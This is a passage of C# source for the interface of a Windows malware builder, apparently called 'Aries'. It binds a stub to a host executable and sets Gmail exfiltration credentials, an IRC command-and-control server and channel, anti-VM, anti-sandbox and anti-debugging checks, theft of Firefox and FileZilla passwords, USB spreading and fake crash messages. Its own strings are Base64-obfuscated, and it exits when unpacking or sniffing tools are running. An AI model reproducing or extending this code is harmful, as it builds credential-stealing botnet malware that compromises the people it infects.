                DebugLBL1.Text += FromBase64("U2tpcHBlZCBmaWxlIGNvbXByZXNzaW9uIG9uIHRoZSB0YXJnZXQgZmlsZSBhcyBpdCB3b3VsZCBtYWtlIHRoZSBmaWxlIGxhcmdlciB0aGFuIHRoZSBvcmlnaW5hbA==") + '\n';
            }
            else
            {
                Util.compressed = true;
                //Target file size after compressing: 
                DebugLBL1.Text += FromBase64("VGFyZ2V0IGZpbGUgc2l6ZSBhZnRlciBjb21wcmVzc2luZzog") +
                    CodeDOMCompiler.SetBytes(Encoding.Default.GetBytes(Util.file1TargetFileOutput), false) + '\n';
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Instance.comboFakeSign.SelectedIndex = 0;
            Instance.ComboCrashOptions.SelectedIndex = 0;

            //Check for these tools
            if ((Util.GetModuleHandle("Sniffer2HelperWin32.dll").ToInt32() != 0) || Util.IsProcessRunning(".NET Generic Unpacker") ||
                Util.IsProcessRunning("PvLog .NET Sniffer"))
            {
                MessageBox.Show(FromBase64("Tm8="));
                goto Label_0;
            }

            //check the serial
            //serial.txt
            if (!File.Exists(FromBase64("c2VyaWFsLnR4dA==").ToLower()) ||
                !HardwareLock.verifySerial(File.ReadAllText(FromBase64("c2VyaWFsLnR4dA==").ToLower()), HardwareLock.GetHardwareID()))
            {
                //Invalid serial, Error
               // MessageBox.Show(FromBase64("SW52YWxpZCBzZXJpYWw="), FromBase64("RXJyb3I="), MessageBoxButtons.OK, MessageBoxIcon.Error);
               // Environment.Exit(-1);
            }
            
            Instance.GroupBox2.ForeColor = Color.DeepPink;
            Instance.TextMutex.Text = Util.getRandNum(new Random().Next(10, 20));

            //stub.exe
            if (!File.Exists(FromBase64("c3R1Yi5leGU=").ToLower()))
            {
                //stub.exe not found, closing.
                MessageBox.Show(FromBase64("c3R1Yi5leGUgbm90IGZvdW5kLCBjbG9zaW5nLg=="));
                goto Label_0;
            }

            try
            {
                //Load the user settings
                string settings = File.ReadAllText("settings.txt", Encoding.Default);
                string[] fsettings = Strings.Split(settings, "\n", -1, CompareMethod.Text);

                Instance.TextMutex.Text = fsettings[0];
                Instance.TextGmailAcc.Text = fsettings[1];
                Instance.TextGmailPass.Text = fsettings[2];
                Instance.txtIRCServ.Text = fsettings[3];
                Instance.txtIRCServPass.Text = fsettings[4];
                Instance.txtIRCServPort.Text = fsettings[5];
                Instance.txtIRCServChannel.Text = fsettings[6];
                Instance.txtIRCServChanPass.Text = fsettings[7];
                Instance.txtIRCServMasterUser.Text = fsettings[8];
                Instance.txtIRCAuthHost.Text = fsettings[9];
                Instance.CheckVboxvmware.Checked = Convert.ToBoolean(fsettings[10]);
                Instance.CheckAntiSandbox.Checked = Convert.ToBoolean(fsettings[11]);
                Instance.CheckAntiSniff.Checked = Convert.ToBoolean(fsettings[12]);
                Instance.CheckSysint.Checked = Convert.ToBoolean(fsettings[13]);
                Instance.ComboCrashOptions.SelectedIndex = Convert.ToInt32(fsettings[14]);
                Instance.CheckEnableMsg.Checked = Convert.ToBoolean(fsettings[15]);
                Instance.CheckVirtOnly.Checked = Convert.ToBoolean(fsettings[16]);
                Instance.CheckFirefox.Checked = Convert.ToBoolean(fsettings[17]);
                Instance.CheckUSBSpread.Checked = Convert.ToBoolean(fsettings[18]);
                Instance.txtIRCLoginPass.Text = fsettings[19];
            }
            catch (Exception) { }
            return;
        Label_0:
            {
                Environment.Exit(-1);
            }
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Save the user settings
            StreamWriter saveStream = new StreamWriter("settings.txt");
            saveStream.Write(
                Instance.TextMutex.Text
                + '\n' + Instance.TextGmailAcc.Text + '\n' + Instance.TextGmailPass.Text
                + '\n' + Instance.txtIRCServ.Text + '\n' + Instance.txtIRCServPass.Text
                + '\n' + Instance.txtIRCServPort.Text + '\n' + Instance.txtIRCServChannel.Text
                + '\n' + Instance.txtIRCServChanPass.Text + '\n' + Instance.txtIRCServMasterUser.Text
                + '\n' + Instance.txtIRCAuthHost.Text + '\n' + Instance.CheckVboxvmware.Checked
                + '\n' + Instance.CheckAntiSandbox.Checked + '\n' + Instance.CheckAntiSniff.Checked
                + '\n' + Instance.CheckSysint.Checked + '\n' + Instance.ComboCrashOptions.SelectedIndex
                + '\n' + Instance.CheckEnableMsg.Checked + '\n' + Instance.CheckVirtOnly.Checked
                + '\n' + Instance.CheckFirefox.Checked + '\n' + Instance.CheckUSBSpread.Checked
                + '\n' + Instance.txtIRCLoginPass.Text);
            saveStream.Close();
        }

        /// <summary>
        /// Send a test email to their gmail account
        /// </summary>
        private void SendTestEmail()
        {
            try
            {
                SmtpClient Client = new SmtpClient("smtp.gmail.com", 25);
                Client.EnableSsl = true;
                Client.Credentials = new System.Net.NetworkCredential(Instance.TextGmailAcc.Text, Instance.TextGmailPass.Text);
                MailMessage msg = new MailMessage();
                msg.To.Add(new MailAddress(Instance.TextGmailAcc.Text));
                msg.From = new MailAddress(Instance.TextGmailAcc.Text);
                msg.Subject = "Test Email Subject, sent by Aries";
                msg.Body = "Test Email Body, sent by Aries";
                Client.Send(msg);
                msg.Dispose();
                MessageBox.Show("Test email sent", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception xc) { MessageBox.Show("Error sending the test email!\nError: " + xc.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }
            GC.Collect();
        }

        /// <summary>
        /// set all of the settings to be appended at the end of the binded files
        /// </summary>
        private void SetFileInfo()
        {
            if (Instance.CheckEncrypt.Checked)
                Util.EncryptHost = true;
            else Util.EncryptHost = false;

            if (Instance.CheckVboxvmware.Checked)
                Util.AntiVirtual = true;
            else Util.AntiVirtual = false;

            if (Instance.CheckAntiSandbox.Checked)
                Util.AntiSandbox = true;
            else Util.AntiSandbox = false;

            if (Instance.CheckEnableMsg.Checked)
                Util.DisplayErrorMsg = true;
            else Util.DisplayErrorMsg = false;

            if (Instance.CheckVirtOnly.Checked)
                Util.DisplayInVirtual = true;
            else Util.DisplayInVirtual = false;

            Util.GmailUser = Util.AESClass.EncryptToString(Instance.TextGmailAcc.Text);
            Util.GmailPass = Util.AESClass.EncryptToString(Instance.TextGmailPass.Text);

            Util.ErrorTitle = Util.AESClass.EncryptToString(Instance.ErrorTitle.Text);
            Util.ErrorBody = Util.AESClass.EncryptToString(Instance.ErrorBody.Text);
            Util.CrashType = Instance.ComboCrashOptions.SelectedIndex;

            if (Instance.CheckFirefox.Checked)
                Util.SendFirefoxFilezilla = true;
            else Util.SendFirefoxFilezilla = false;

            if (Instance.CheckAntiSniff.Checked)
                Util.AntiSniffDebug = true;
            else Util.AntiSniffDebug = false;

            if (Instance.CheckUSBSpread.Checked)
                Util.USBSpread = true;
            else Util.USBSpread = false;

            if (Instance.CheckSysint.Checked)
                Util.AntiSysinternals = true;
            else Util.AntiSysinternals = false;

            if (Instance.checkUseHandle.Checked)
                Util.UseRandomNick = true;
            else Util.UseRandomNick = false;
        }

        private void SerialTimer_Tick(object sender, EventArgs e)
        {//Check the users serial every 20-45 seconds
            //SerialTimer.Interval = new Random().Next(20000, 45000);
            //new Thread(checkSerial).Start();
        }

        /*/// <summary>
        /// Used in verifying the user's serial
        /// </summary>
        private void checkSerial()
        {
            SHA512Managed managed = new SHA512Managed();
            int i = Convert.ToInt32(Encoding.Default.GetString(Convert.FromBase64String("ODY5")));
            managed.ComputeHash(Encoding.Unicode.GetBytes(HardwareLock.EncryptWithXor(HardwareLock.GetHardwareID(), i)));
            StringBuilder builder = new StringBuilder();
            builder.Append(Strings.Mid(Convert.ToBase64String(managed.Hash).ToUpper(), 1, 5));
            builder.Append("-");
            builder.Append(Strings.Mid(Convert.ToBase64String(managed.Hash).ToUpper(), 12, 5));
            builder.Append("-");
            builder.Append(Strings.Mid(Convert.ToBase64String(managed.Hash).ToUpper(), 19, 5));
            builder.Append("-");
            builder.Append(Strings.Mid(Convert.ToBase64String(managed.Hash).ToUpper(), 40, 5));
            builder.Append("-");
            builder.Append(Strings.Mid(Convert.ToBase64String(managed.Hash).ToUpper(), 32, 5));
            builder.Append("-");
            builder.Append(Strings.Mid(Convert.ToBase64String(managed.Hash).ToUpper(), 86, 5));
            if (File.ReadAllText("serial.txt") != builder.ToString())
            {
                Environment.Exit(-1);
            }
            GC.Collect();
        }*/

        #region MouseControls
        Point lastClick;
        private void MouseMoved_Control(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastClick.X;
                this.Top += e.Y - lastClick.Y;
            }
        }

        private void MouseDown_Control(object sender, MouseEventArgs e)
        {
            lastClick = new Point(e.X, e.Y);
        }

        private void Form1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.X > 605 & e.Y < 15)
            {
                Application.Exit();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

            Instance.Controls.Add(panel1);
            Instance.panel1.BringToFront();
            Instance.panel1.Visible = true;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Instance.Controls.Add(panel2);
            Instance.panel2.BringToFront();
            Instance.panel2.Visible = true;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Instance.Controls.Add(panel2);
            Instance.panel3.Visible = true;
            Instance.panel3.BringToFront();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Instance.Controls.Add(panel4);
            Instance.panel4.Visible = true;
            Instance.panel4.BringToFront();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            Instance.Controls.Add(panel5);
            panel5.Visible = true;
            panel5.BringToFront();
        }
        #endregion

        private void checkHidePass_CheckedChanged(object sender, EventArgs e)
        {
            if (Instance.checkHidePass.Checked)
                Instance.TextGmailPass.PasswordChar = '\0';
            else Instance.TextGmailPass.PasswordChar = '*';
        }

        private void checkIconM1_CheckedChanged(object sender, EventArgs e)
        {
            if (Instance.checkIconM1.Checked) { Instance.checkIconM2.Checked = false; }
            else { Instance.checkIconM2.Checked = true; }
        }

        private void checkIconM2_CheckedChanged(object sender, EventArgs e)
        {
            if (Instance.checkIconM2.Checked) { Instance.checkIconM1.Checked = false; }
            else { Instance.checkIconM1.Checked = true; }
        }

        private void label3_Click(object sender, EventArgs e)
        {
            if (Instance.CheckVirtOnly.Checked & Instance.CheckEnableMsg.Checked)
            {
                Instance.CheckVirtOnly.Checked = false;
            }
            else if (!Instance.CheckVirtOnly.Checked & Instance.CheckEnableMsg.Checked)
            {
                Instance.CheckVirtOnly.Checked = true;
            }
        }

        private void CheckChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            if (Instance.CheckChangeIcon.Checked) Instance.checkmainicon.Checked = false;
        }

        private void checkmainicon_CheckedChanged(object sender, EventArgs e)
        {
            if (Instance.checkmainicon.Checked) Instance.CheckChangeIcon.Checked = false;

        }

        private void btnChooseIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog filedialog = new OpenFileDialog();
            filedialog.FileName = null;
            filedialog.Filter = "ico file (*.ico)|*.ico|exe file (*.exe)|*.exe";
            filedialog.Title = "Choose icon/file to copy icon from";
            filedialog.InitialDirectory = Application.StartupPath;
            filedialog.ShowDialog();

            if (filedialog.FileName == null) { return; }
            Instance.textIconPath.Text = filedialog.FileName;
            filedialog.Dispose();
        }

        private void btnGenMutex_Click(object sender, EventArgs e)
        {
            Instance.TextMutex.Text = Util.getRandNum(new Random().Next(10, 20));
        }

        private void Label4_Click(object sender, EventArgs e)
        {
            Instance.RadioButton4.Checked = true; //choose no icon option
        }

        private void CheckEnableMsg_CheckedChanged(object sender, EventArgs e)
        {
            if (Instance.CheckEnableMsg.Checked) { Instance.CheckVirtOnly.Enabled = true; }
            else
            {
                Instance.CheckVirtOnly.Enabled = false;
                Instance.CheckVirtOnly.Checked = false;
            }
        }

        private void CheckTopmost_CheckedChanged(object sender, EventArgs e)
        {
            if (Instance.CheckTopmost.Checked) { Instance.TopMost = true; } else { Instance.TopMost = false; }
        }

        private void MessageIconRadioChanged(object sender, EventArgs e)
        {
            if (Instance.RadioButton1.Checked)
            {
                Util.msgIcon = "1";// MessageBoxIcon.Error;
            }
            else if (Instance.RadioButton2.Checked)
            {
                Util.msgIcon = "2";// MessageBoxIcon.Exclamation;
            }
            else if (Instance.RadioButton3.Checked)
            {
                Util.msgIcon = "3";// MessageBoxIcon.Question;
            }
            else if (Instance.RadioButton4.Checked)
            {
                Util.msgIcon = "4";// MessageBoxIcon.None;
            }
            else if (Instance.RadioButton5.Checked)
            {
                Util.msgIcon = "5";// MessageBoxIcon.Information;
            }
        }

        private bool PrepareForBind()
        {
            //Check all required items are present

            //serial.txt
            if (!File.Exists(FromBase64("c2VyaWFsLnR4dA==").ToLower()) ||
                !HardwareLock.verifySerial(File.ReadAllText(FromBase64("c2VyaWFsLnR4dA==").ToLower()), HardwareLock.GetHardwareID()))
            {
                //Invalid serial, Error
                //MessageBox.Show(FromBase64("SW52YWxpZCBzZXJpYWw="), FromBase64("RXJyb3I="), MessageBoxButtons.OK, MessageBoxIcon.Error);
               // Environment.Exit(-1);
            }

            //stub.exe
            if (!File.Exists(FromBase64("c3R1Yi5leGU=").ToLower()))
            {
                //stub.exe not found
                MessageBox.Show(FromBase64("c3R1Yi5leGUgbm90IGZvdW5k"));
                return false;
            }

            if (!File.Exists(Instance.TextHostFile.Text)) { MessageBox.Show("Target file not found"); return false; }

            //Choose file to save as
            Instance.svdlg.FileName = null;
            Instance.svdlg.Filter = "exe files (*.exe)|*.exe";
            Instance.svdlg.Title = "Save As";
            Instance.svdlg.InitialDirectory = Application.StartupPath;
            Instance.svdlg.ShowDialog();
            if (Instance.svdlg.FileName == String.Empty) { return false; }
            if (Path.GetDirectoryName(Instance.svdlg.FileName) != Instance.svdlg.InitialDirectory)
            {
                MessageBox.Show("Must save in the same dir. as binder/stub", "Error", MessageBoxButtons.OK);
                return false;
            }
            string SaveName = Path.GetFileName(Instance.svdlg.FileName);
            if (File.Exists(SaveName)) { File.Delete(SaveName); }
            Instance.DebugLBL1.Text = String.Empty;


            //Clean up
            if (File.Exists("icon.ico")) { File.Delete("icon.ico"); }
            if (File.Exists("icon.exe")) { File.Delete("icon.exe"); }
            if (Instance.textIconPath.Text == String.Empty) { Instance.textIconPath.Text = @"\null\"; }

            //Copy icon or the file which the icon will be taken from to the same directory.
            //Needed for Compiling the loader, all files to be compiled need to be in the same directory.
            if (Instance.checkmainicon.Checked)
            {
                if (!(Path.GetDirectoryName(Instance.TextHostFile.Text) == Application.StartupPath))
                    File.Copy(Instance.TextHostFile.Text, "icon.exe");
            }

            if (Instance.CheckChangeIcon.Checked)
            {
                if (!(Path.GetDirectoryName(textIconPath.Text) == Application.StartupPath) &
                   (Path.GetExtension(Instance.textIconPath.Text.ToLower()) == ".ico"))
                    File.Copy(Instance.textIconPath.Text, "icon.ico");
            }

            if (!Instance.TextHostFile.Text.ToLower().EndsWith(".exe") || !File.Exists(Instance.TextHostFile.Text))
            {
                Interaction.MsgBox("Invalid file to bind with. Need a .exe", MsgBoxStyle.OkOnly, "Error");
                return false;
            }
            return true;
        }

        private void radioReqLogin_CheckedChanged(object sender, EventArgs e)
        {
            Util.ProtectNum = "1";
            Instance.txtIRCAuthHost.Enabled = false;
            Instance.txtIRCLoginPass.Enabled = true;
            Instance.txtIRCLoginPass.Focus();
        }

        private void radioReqvHost_CheckedChanged(object sender, EventArgs e)
        {
            Instance.txtIRCAuthHost.Enabled = true;
            Instance.txtIRCLoginPass.Enabled = false;
            Util.ProtectNum = "2";
            Instance.txtIRCAuthHost.Focus();
        }

        private void radioReqBoth_CheckedChanged(object sender, EventArgs e)
        {
            Instance.txtIRCAuthHost.Enabled = true;
            Util.ProtectNum = "3";
            Instance.txtIRCLoginPass.Enabled = true;
            Instance.txtIRCAuthHost.Focus();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(SendTestEmail).Start();
            MessageBox.Show("Sending test email...");
        }
    }
}